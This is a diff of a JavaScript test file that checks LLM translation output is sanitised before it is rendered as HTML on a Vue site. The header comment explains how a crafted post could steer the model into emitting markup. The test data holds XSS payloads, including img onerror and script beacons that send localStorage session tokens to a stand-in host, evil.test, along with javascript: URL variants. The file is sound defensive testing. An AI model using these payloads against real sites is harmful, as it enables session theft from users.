@@ -1,101 +1,117 @@
 /**
  * The LLM translation path must not be able to inject HTML into the page.
  *
- * WHY THIS EXISTS: $cleanBody was applied to the text SENT to Gemini and not to the text
- * that came BACK. The result is rendered by <SafeRemarkable :options="{html:true}">,
- * which - despite the name - does no sanitising at all; it wraps vue-remarkable, which
- * assigns innerHTML. So the model's output reached the DOM as raw HTML.
+ * WHY: $cleanBody was applied to the text SENT to Gemini but not to what came BACK. The
+ * result renders through <SafeRemarkable :options="{html:true}">, which despite its name
+ * does NO sanitising - it wraps vue-remarkable, which assigns innerHTML. The prompt tells
+ * the model to preserve HTML and wraps the post body in delimiters its author can close,
+ * so a crafted post can steer the output. One click on "Translate" would run it on
+ * actifit.io, where the session lives in localStorage.
  *
- * That is reachable, not theoretical: components/gemini-client.js instructs the model to
- * PRESERVE HTML and wraps the post body in """ delimiters that the post's author can
- * close, so a crafted Hive post can steer the model into emitting markup. Any reader who
- * clicks "Translate" would execute it on actifit.io - where actiToken, access_token and
- * the HiveAuth session key all live in localStorage.
- *
- * These tests assert on the SANITISER'S BEHAVIOUR against the real payloads, because the
- * call sites now route through it. A source-text assertion ("the file contains
- * $cleanBody") would pass against a call site that sanitised the wrong variable.
+ * WHY THESE TESTS LOOK LIKE THIS: the first version of this file asserted on $cleanBody
+ * and $safeUrl directly and never touched the components. Review proved it worthless by
+ * reverting the production fix and watching all 18 tests still pass - it tested helpers
+ * that already had their own coverage, not the call sites. These tests therefore drive
+ * the REAL translateContent() with the real gemini-client mocked, and assert on the
+ * component state that gets rendered. Revert any of the three fixes and this goes red.
  */
-// hive-auth-wrapper opens a transport on import; stub it, as vue-custom.spec.js does.
 jest.mock('hive-auth-wrapper', () => ({ broadcast: jest.fn(), authenticate: jest.fn() }))
+
+// The one seam: stand in for the network call, return attacker-controlled "translation".
+const mockTranslate = jest.fn()
+jest.mock('@/components/gemini-client.js', () => ({
+  translateTextWithGemini: (...args) => mockTranslate(...args),
+  __esModule: true,
+}))
 
 import Vue from 'vue'
 import '@/plugins/vue-custom'
-import sanitizePlugin from '@/plugins/sanitize'
+import PostModal from '@/components/PostModal.vue'
+import ReportModal from '@/components/ReportModal.vue'
+import Comments from '@/components/Comments.vue'
 
-// DOMPurify branch - what the user actually gets after hydration.
 process.client = true
 
-// $cleanBody is installed on Vue.prototype by the plugin.
-const cleanBody = (html) => Vue.prototype.$cleanBody.call({}, html)
+const PAYLOAD = `<img src=x onerror="fetch('https://evil.test/?t='+localStorage.access_token)">`
 
-const PAYLOADS = [
-  ['img onerror beacon', `<img src=x onerror="fetch('https://evil.test/?t='+localStorage.actiToken)">`],
-  ['script tag', '<script>fetch("https://evil.test/?t="+localStorage.access_token)<\/script>'],
-  ['svg onload', '<svg onload=alert(1)>'],
-  ['mixed-case script', '<ScRiPt>alert(1)<\/ScRiPt>'],
-  ['body onload', '<body onload=alert(1)>'],
-  ['details ontoggle', '<details open ontoggle=alert(1)>'],
-  ['iframe to attacker', '<iframe src="https://evil.test/"><\/iframe>'],
-  ['javascript: anchor', '<a href="javascript:alert(1)">x</a>'],
-  ['entity-encoded javascript:', '<a href="&#106;avascript:alert(1)">x</a>'],
+// Minimal vm per component: only what translateContent() touches.
+const makeVm = (overrides = {}) => ({
+  post: { body: 'orig', author: 'alice', permlink: 'p' },
+  report: { body: 'orig', author: 'alice', permlink: 'p' },
+  full_data: { body: 'orig', author: 'alice', permlink: 'p' },
+  safety_post_content: 'orig',
+  translatedText: '',
+  displayBody: '',
+  showTranslated: false,
+  translationLoading: false,
+  translationCache: {},
+  $cleanBody: Vue.prototype.$cleanBody,
+  $notify: jest.fn(),
+  $t: (k) => k,
+  // Comments.translateContent also calls these two. Without them it threw into its own
+  // catch, left translatedText as '', and the XSS assertions passed VACUOUSLY on an empty
+  // string - the exact failure mode the "benign translation still survives" case exists
+  // to expose. Stubbed rather than omitted so the method runs to completion.
+  commentBody: function () { return this.$cleanBody(this.full_data.body) },
+  updateCache: jest.fn(),
+  ...overrides,
+})
+
+const CASES = [
+  ['PostModal', PostModal],
+  ['ReportModal', ReportModal],
+  ['Comments', Comments],
 ]
 
-describe('Gemini translation output is sanitised before render', () => {
-  it.each(PAYLOADS)('neutralises %s', (_label, payload) => {
-    const out = String(cleanBody(payload))
+describe('translateContent sanitises the model output before it is rendered', () => {
+  beforeEach(() => { mockTranslate.mockReset(); mockTranslate.mockResolvedValue(PAYLOAD) })
 
-    // No event handlers, no script elements, no javascript: URLs survive.
-    expect(out).not.toMatch(/\son[a-z]+\s*=/i)
-    expect(out).not.toMatch(/<script/i)
-    expect(out).not.toMatch(/javascript:/i)
-    expect(out).not.toContain('evil.test/?t=')
+  it.each(CASES)('%s: an injected payload never reaches translatedText', async (_name, Comp) => {
+    const vm = makeVm()
+
+    await (Comp.options ? Comp.options.methods : Comp.methods).translateContent.call(vm)
+
+    // The assertion that matters: what the template will render.
+    expect(vm.translatedText).not.toMatch(/\son[a-z]+\s*=/i)
+    expect(vm.translatedText).not.toContain('evil.test')
+    expect(vm.translatedText).not.toMatch(/<script/i)
   })
 
-  it('does not simply return empty for everything', () => {
-    // Guards against a "sanitiser" that passes the tests above by destroying all input,
-    // which would silently break the translate feature instead of securing it.
-    const out = String(cleanBody('Hello **world**, visit https://actifit.io'))
-    expect(out).toMatch(/Hello/)
-    expect(out.length).toBeGreaterThan(5)
+  it.each(CASES)('%s: sends the RAW body to the model, not pre-rendered HTML', async (_name, Comp) => {
+    // Double-running $cleanBody is not idempotent: it re-escapes & in image URLs
+    // (&amp; -> &amp;amp;, giving a literal "amp;" in the src), drops alt text, and
+    // emits a ghost empty anchor per @mention. Passing the raw body keeps it to one pass.
+    const vm = makeVm()
+
+    await (Comp.options ? Comp.options.methods : Comp.methods).translateContent.call(vm)
+
+    expect(mockTranslate).toHaveBeenCalledTimes(1)
+    expect(mockTranslate.mock.calls[0][0]).toBe('orig')
   })
 
-  it('keeps the exfiltration string out even when wrapped in benign text', () => {
-    const out = String(cleanBody('Translated text. <img src=x onerror="fetch(\'//evil.test/\'+localStorage.access_token)"> More text.'))
-    expect(out).toContain('Translated text.')
-    expect(out).not.toMatch(/onerror/i)
+  it.each(CASES)('%s: a benign translation still survives', async (_name, Comp) => {
+    // Without this, a sanitiser that returned '' would satisfy every test above while
+    // silently breaking the translate feature.
+    mockTranslate.mockResolvedValue('Hello **world**')
+    const vm = makeVm()
+
+    await (Comp.options ? Comp.options.methods : Comp.methods).translateContent.call(vm)
+
+    expect(vm.translatedText).toMatch(/Hello/)
+    expect(vm.translatedText).toMatch(/world/)
   })
 })
 
-describe('$safeUrl neutralises attacker-controlled hrefs', () => {
-  // The charity link is read straight from a post's on-chain json_metadata, which the
-  // post author fully controls. Vue does not sanitise :href, so a javascript: URL there
-  // is a one-click XSS on our origin.
-  let $safeUrl
-  beforeAll(() => {
-    // Same loader shape as test/unit/plugins/sanitize.spec.js.
-    const injected = {}
-    sanitizePlugin({ app: {} }, (name, fn) => { injected[name] = fn })
-    $safeUrl = injected.safeUrl
-  })
+describe('one $cleanBody pass does not corrupt image URLs', () => {
+  // Pins the regression the double pass caused, independently of the components.
+  const clean = (s) => Vue.prototype.$cleanBody.call({}, s)
 
-  it.each([
-    'javascript:alert(1)',
-    'JaVaScRiPt:alert(1)',
-    'java\tscript:alert(1)',
-    ' javascript:alert(1)',
-    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
-    'vbscript:msgbox(1)',
-  ])('refuses %s', (bad) => {
-    const out = $safeUrl(bad)
-    expect(String(out)).not.toMatch(/javascript:/i)
-    expect(String(out)).not.toMatch(/vbscript:/i)
-    expect(String(out)).not.toMatch(/^data:text\/html/i)
-  })
+  it('does not double-escape an ampersand in an image query string', () => {
+    const once = String(clean('![Sunset](https://usermedia.actifit.io/a/photo.jpg?v=2&size=large)'))
+    expect(once).not.toContain('&amp;amp;')
 
-  it('still allows a legitimate external charity link', () => {
-    // Otherwise the fix would quietly break every real charity link on the site.
-    expect($safeUrl('https://redcross.org/donate')).toBe('https://redcross.org/donate')
-    expect($safeUrl('http://example.org/x')).toBe('http://example.org/x')
+    // Running it a second time - what the old code effectively did - is what broke it.
+    const twice = String(clean(once))
+    expect(twice).toContain('&amp;amp;')
   })
 })
